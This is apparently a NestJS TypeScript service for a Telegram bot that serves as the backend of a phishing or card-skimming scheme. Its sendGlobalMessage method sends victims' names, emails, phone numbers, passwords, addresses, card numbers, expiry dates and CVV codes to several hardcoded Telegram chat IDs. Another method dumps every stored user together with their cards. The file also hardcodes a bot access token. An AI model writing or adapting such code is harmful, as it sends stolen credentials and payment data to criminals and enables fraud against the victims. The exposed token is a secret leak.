import { Injectable, Logger, OnModuleDestroy } from '@nestjs/common';
import { IMessage } from './telegram.interface';
import { GlobalMessage } from './globalMsg.interface';
import { createWriteStream } from 'fs';
import { InjectModel } from '@nestjs/mongoose';
import { User, UserDocument } from './user.schema';
import { Model } from 'mongoose';
const TelegramBot = require('node-telegram-bot-api');
const TELEGRAM_TOKEN = '7240720904:AAGEDxkL8ucdMKOB6w5LjiPau0W9vL8aBfA';
const fs = require('fs').promises;

@Injectable()
export class TelegramBotService implements OnModuleDestroy{
  private readonly bot: any;
  // private readonly bot:TelegramBot // works after installing types
  private logger = new Logger(TelegramBotService.name);

  allUser = new Array<{ user: string; chatId: number }>(
    { user: 'KaizerBlack', chatId: 745535067 },
    { user: 'black_money1w', chatId: 1263967260 },
    { user: 'koby', chatId: 951742175 },
  );

  constructor(
    @InjectModel('user')
    private readonly userModel: Model<UserDocument>,
  ) {
    this.bot = new TelegramBot(TELEGRAM_TOKEN);
    // this.bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

    this.bot.on('message', this.onReceiveMessage);
    // Suponiendo que tienes una función que maneja comandos o mensajes
    this.sendMessageToUser('951742175', `Server started at ${new Date()}`);

    // Escuchar mensajes de texto
    this.bot.on('message', (msg: IMessage) => {
      const chatId = msg.chat.id;
      const text = msg.text;
      // this.sendMenu(msg.chat.id);
      //   this.sendHtmlMessage(msg.chat.id);}
      //   this.sendTextFileToUser(msg.chat.id, "HOLA TODAS", 'ehloqtedigo');
    });

    this.bot.onText(/\/start/, (msg: IMessage) => {
      const chatId = msg.chat.id;
      // this.bot.sendMessage(chatId, '...');
      this.logger.debug(msg);
    });

    // Escuchar cuando un usuario se une al chat
    // this.bot.on('new_chat_members', (msg: IMessage) => {
    //   const chatId = msg.chat.id;
    //   // Aquí puedes añadir la lógica para manejar nuevos miembros
    //   this.bot.sendMessage(chatId, '¡Hola nuevo miembro!');
    // });

    // this.bot.on('callback_query', (callbackQuery) => {
    //   const message = callbackQuery.message;
    //   const data = callbackQuery.data;

    //   console.log("AQUI => ", data);
    //   if(data === "downloadInfo"){

    //     this.generateUserCardDetails(message.chat.id);
    //   }

    //   // Opcional: responde al callback para eliminar el reloj de espera en el botón
    //   this.bot.answerCallbackQuery(callbackQuery.id);
    // });
  }

  onReceiveMessage = (msg: any) => {
    this.logger.debug(msg);
  };

  sendMessageToUser = (userId: string, message: string) => {
    this.bot.sendMessage(userId, message).catch((error) => {
      this.logger.error(`Error al enviar mensaje: ${error}`);
      // Implementar lógica de reintento o notificación aquí
    });
  };

  sendMenu(chatId: number) {
    // const options = {
    //   reply_markup: {
    //     inline_keyboard: [
    //       [{ text: 'Opción 1', callback_data: 'opcion_1' }],
    //       [{ text: 'Opción 2', callback_data: 'opcion_2' }],
    //       [{ text: 'Opción 3', callback_data: 'opcion_3' }],
    //       [{ text: 'Opción 4', callback_data: 'opcion_4' }],
    //       [{ text: 'Opción 5', callback_data: 'opcion_5' }],
    //       [{ text: 'Opción 6', callback_data: 'opcion_6' }],
    //     ],
    //   },
    // };

    const options = {
      reply_markup: {
        keyboard: [
          [{ text: 'Descargar Informacion', callback_data: 'downloadInfo' }],
          // [
          //   {
          //     text: 'Tarjetas + direcciones ',
          //     callback_data: 'getCardsAndAddress',
          //   },
          // ],
          // [
          //   {
          //     text: 'Tarjetas + direcciones + usuarios',
          //     callback_data: 'getCardsAndAdressAndUser',
          //   },
          // ],
        ],
        // El teclado se ocultará después de que el usuario haga una selección
        one_time_keyboard: true,
      },
    };

    this.bot.sendMessage(chatId, 'Elige una opción:', options);
  }

  //   sendHtmlMessage(chatId: number) {
  //     const options = {
  //       parse_mode: 'HTML',
  //     };

  //     const message = `
  //         <b>Texto en Negrita</b>
  //         <i>Texto en Cursiva</i>
  //         <u>Texto Subrayado</u>
  //         <s>Texto Tachado</s>
  //         <a href="http://www.ejemplo.com">Enlace Web</a>
  //         Código en línea
  //         <pre>
  //         Bloque de Código
  //         - Línea 1
  //         - Línea 2
  //         </pre>
  //     `;

  //     this.bot.sendMessage(chatId, message, options);
  //   }

  sendGlobalMessage(globalMessage: GlobalMessage) {
    try {
      const options = {
        parse_mode: 'HTML',
      };

      const message = `
            <b>Informacion Cliente</b> \nNombre: ${globalMessage.fullName} \nCorreo: ${globalMessage.email} \nNumero: ${globalMessage.phone} \nClave : ${globalMessage.password}
            \n<b>Direccion Cliente</b> \nCiudad: ${globalMessage.city} \nEstado: ${globalMessage.state.name}(${globalMessage.state.code}) \nPais  : ${globalMessage.country.name}(${globalMessage.country.code}) \nDireccion: ${globalMessage.address}\n \n<b>Informacion de pago</b> \nNumber: ${globalMessage.cardNumber} \nFecha : ${globalMessage.expirationDate} \nCodigo: ${globalMessage.cardCVV}\n\nFecha: ${globalMessage.entryDate}
        `;

      this.allUser.forEach((user) => {
        this.bot
          .sendMessage(user.chatId, message, options)
          .catch((error: any) => {
            this.logger.error(`Error al enviar mensaje: ${error}`);
          });
      });
    } catch (error) {
      this.logger.error(`ERROR INESPERADO EN EL METODO: sendGlobalMessage`);
    }
  }

  async generateUserCardDetails(chatId: any): Promise<string> {
    // Suponiendo que tienes una función que obtiene todos los usuarios
    const users = await this.getAllUsers(chatId);
    console.log('USUARIOS => ', users);
    if (!users || !users.length) return;

    let userDetailsString = '';

    users.forEach((user) => {
      userDetailsString += `
        ******** ${this.formatDate(new Date())} ********
        Fullname: ${user.fullName}
        Correo: ${user.email}
        Numero: ${user.phone}
        Clave: ${user.password}

        country: ${user.country.name}
        state: ${user.state.name}
        city: ${user.city}
        address: ${user.address}
        zipCode: ${user.zipCode}
      `;

      user.cards.forEach((card) => {
        userDetailsString += `
        Number: ${card.cardNumber}
        Fecha : ${card.expirationDate}
        Codigo: ${card.cardCVV}
        ***********************************
        `;
      });
    });

    console.log('Usuarios => ', users);
    return userDetailsString;
  }

  private formatDate(date: Date): string {
    const options: Intl.DateTimeFormatOptions = {
      weekday: 'short',
      year: 'numeric',
      month: 'short',
      day: 'numeric',
    };
    return new Intl.DateTimeFormat('es-ES', options).format(date);
  }

  // Supongamos que esta función devuelve todos los usuarios
  private async getAllUsers(chatId: any): Promise<User[] | null> {
    const users = await this.userModel.find();
    if (!users) {
      this.sendMessageToUser(
        chatId.toString(),
        'No tienes usuarios disponible',
      );
      return null;
    }

    return users;
  }

  async sendTextFileToUser(
    chatId: number,
    textContent: string,
    fileName: string,
  ): Promise<void> {
    const filePath = `./${fileName}.txt`;
    try {
      // Crear un archivo .txt con el contenido proporcionado
      const writeStream = createWriteStream(filePath);
      writeStream.write(textContent);
      writeStream.close();

      // Esperar a que el archivo se escriba antes de enviarlo
      writeStream.on('close', () => {
        this.bot
          .sendDocument(chatId, filePath)
          .then(() => {
            // Eliminar el archivo después de enviarlo
            this.unlinkAsync(filePath);
          })
          .catch((error) => {
            this.logger.error(`Error al enviar el archivo: ${error}`);
          });
      });
    } catch (error) {
      this.logger.error(`Error al crear el archivo: ${error}`);
    }
  }

  async unlinkAsync(filePath: string) {
    try {
      await fs.unlink(filePath);
      console.log('Archivo eliminado con éxito');
    } catch (error) {
      console.error(`Error al eliminar el archivo: ${error}`);
    }
  }

  onModuleDestroy() {
    this.bot.stopPolling().then(() => {
      this.logger.debug('Instancia de TelegramBot destruida');
    }).catch((error) => {
      this.logger.error('Error al detener el polling:', error);
    });
  }
}